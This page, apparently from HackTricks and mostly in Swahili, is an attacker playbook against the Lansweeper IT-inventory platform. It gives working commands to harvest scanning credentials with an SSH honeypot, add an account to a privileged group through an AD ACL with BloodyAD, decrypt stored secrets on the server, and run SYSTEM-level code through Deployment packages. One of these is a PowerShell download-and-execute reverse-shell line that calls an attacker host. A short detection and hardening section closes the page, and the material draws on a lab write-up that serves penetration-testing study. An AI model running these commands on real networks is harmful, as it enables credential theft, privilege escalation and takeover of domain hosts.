# Matumizi mabaya ya Lansweeper: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper ni jukwaa la kugundua na kuhifadhi kumbukumbu za mali za IT ambalo mara nyingi huwekwa kwenye Windows na kuunganishwa na Active Directory. Credentials zilizosanifiwa ndani ya Lansweeper zinatumiwa na scanning engines zake kuthibitisha kwenye assets kupitia itifaki kama SSH, SMB/WMI na WinRM. Mipangilio mibaya mara nyingi inawezesha:

- Credential interception kwa kupeleka tena scanning target kwa host inayodhibitiwa na mshambuliaji (honeypot)
- Abuse of AD ACLs zinazofichuliwa na vikundi vinavyohusiana na Lansweeper ili kupata ufikiaji wa mbali
- On-host decryption ya Lansweeper-configured secrets (connection strings and stored scanning credentials)
- Code execution kwenye managed endpoints kupitia kipengele cha Deployment (mara nyingi kinaendesha kama SYSTEM)

Ukurasa huu unatoa muhtasari wa workflows za mshambuliaji na amri za vitendo za kutumia tabia hizi wakati wa engagements.

## 1) Harvest scanning credentials via honeypot (SSH example)

Wazo: unda Scanning Target inayowelekeza kwa host yako na uoanishe Scanning Credentials zilizopo nayo. Wakati scan itakapokimbia, Lansweeper itajaribu kuthibitisha kwa kutumia hizo credentials, na honeypot yako itaziwakamata.

Muhtasari wa hatua (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = anwani yako ya VPN
- Sanidi port ya SSH kuwa nambari inayoweza kufikiwa (mf., 2022 ikiwa 22 imezuiwa)
- Zima ratiba na panga kuitisha kwa mkono
- Scanning → Scanning Credentials → hakikisha Linux/SSH creds zipo; ramana hizo kwa target mpya (wezeshwa zote inapohitajika)
- Bonyeza “Scan now” kwenye target
- Endesha SSH honeypot na pokea jina la mtumiaji/nenosiri lililotumika kujaribu kuingia

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Thibitisha creds zilizokamatwa dhidi ya huduma za DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Vidokezo
- Inafanya kazi kwa njia sawa kwa protocols nyingine wakati unaweza ku-coerce the scanner kwa listener wako (SMB/WinRM honeypots, etc.). SSH mara nyingi ni rahisi zaidi.
- Scanners wengi hujitambulisha kwa distinct client banners (e.g., RebexSSH) na watajaribu benign commands (uname, whoami, etc.).

## 2) AD ACL abuse: pata ufikiaji wa mbali kwa kujiongeza kwenye app-admin group

Tumia BloodHound kuorodhesha haki za ufanisi (effective rights) kutoka kwa akaunti iliyoharibiwa. Ugunduzi wa kawaida ni scanner- au app-specific group (e.g., “Lansweeper Discovery”) inayoshikilia GenericAll juu ya group iliyo na hadhi (e.g., “Lansweeper Admins”). Ikiwa group iliyo na hadhi pia ni mwanachama wa “Remote Management Users”, WinRM inapatikana mara tu tunapojiongeza.

Mifano ya collection:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll kwenye kundi na BloodyAD (Linux):
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Kisha pata interactive shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Kidokezo: Operesheni za Kerberos zinategemea muda. Ikiwa unapata KRB_AP_ERR_SKEW, linganisha saa na DC kwanza:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Decrypt Lansweeper-configured secrets on the host

Kwenye seva ya Lansweeper, tovuti ya ASP.NET kwa kawaida huhifadhi encrypted connection string na symmetric key zinazotumiwa na application. Ukiwa na access ya ndani inayofaa, unaweza decrypt DB connection string kisha kutoa stored scanning credentials.

Typical locations:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Use SharpLansweeperDecrypt to automate decryption and dumping of stored creds:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Matokeo yanayotarajiwa yanajumuisha DB connection details na plaintext scanning credentials kama vile akaunti za Windows na Linux zinazotumika katika estate nzima. Hizi mara nyingi zina elevated local rights kwenye domain hosts:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Tumia Windows scanning creds zilizopatikana kwa upatikanaji wa ruhusa za juu:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Kama mwanachama wa “Lansweeper Admins”, UI ya wavuti inaonyesha Deployment na Configuration. Chini ya Deployment → Deployment packages, unaweza kuunda packages ambazo zinaendesha amri za aina yoyote kwenye assets zilizolengwa. Utekelezaji unafanywa na huduma ya Lansweeper kwa vibali vya juu, ukitoa utekelezaji wa msimbo kama NT AUTHORITY\SYSTEM kwenye host iliyochaguliwa.

Hatua za juu:
- Tengeneza package mpya ya Deployment inayotekeleza PowerShell au cmd one-liner (reverse shell, add-user, n.k.).
- Lenga asset unayotaka (kwa mfano, DC/host ambapo Lansweeper inakimbia) na bonyeza Deploy/Run now.
- Pata shell yako kama SYSTEM.

Mifano ya payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Vitendo vya Deployment husababisha kelele na huacha logs katika Lansweeper na Windows event logs. Tumia kwa uangalifu.

## Utambuzi na kuimarisha

- Zuia au ondoa uorodheshaji wa SMB wa anonymous. Fuatilia RID cycling na upatikanaji usio wa kawaida wa Lansweeper shares.
- Egress controls: zuia au punguza kwa ukali outbound SSH/SMB/WinRM kutoka scanner hosts. Toa onyo kwa ports zisizo za kawaida (e.g., 2022) na client banners zisizo za kawaida kama Rebex.
- Linda `Website\\web.config` na `Key\\Encryption.txt`. Hamisha siri kwenye vault na uzibadilishe (rotate) pale zitakapofichuka. Fikiria service accounts zenye privileges za chini na gMSA pale inapofaa.
- AD monitoring: toa onyo kwa mabadiliko ya vikundi vinavyohusiana na Lansweeper (e.g., “Lansweeper Admins”, “Remote Management Users”) na kwa mabadiliko ya ACL yanayotoa GenericAll/Write membership kwa vikundi vilivyo na haki za juu.
- Audit Deployment package creations/changes/executions; toa onyo kwa packages zinazowasha cmd.exe/powershell.exe au muunganisho wa outbound usiotarajiwa.

## Mada zinazohusiana
- SMB/LSA/SAMR enumeration and RID cycling
- Kerberos password spraying and clock skew considerations
- BloodHound path analysis of application-admin groups
- WinRM usage and lateral movement

## References
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
